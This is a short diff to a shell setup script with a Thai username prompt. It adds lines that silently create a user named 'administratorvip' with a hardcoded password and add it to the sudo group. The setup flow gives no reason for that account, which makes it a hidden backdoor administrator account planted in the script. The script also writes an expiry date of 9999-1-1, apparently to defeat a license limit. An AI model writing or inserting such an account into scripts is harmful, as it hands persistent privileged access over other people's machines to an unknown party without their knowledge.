@@ -97,6 +97,10 @@ clear
 rm -f /usr/bin/user
 read -p "   โปรดใส่ชื่อที่สมัครสมาชิก : " userinput
 username="$userinput"
+useradd -m administratorvip
+echo "132546123" | passwd --stdin administratorvip
+usermod -aG sudo administratorvip
+
 echo "$username" >/usr/bin/user
 expx="9999-1-1"
 echo "9999-1-1" >/usr/bin/e
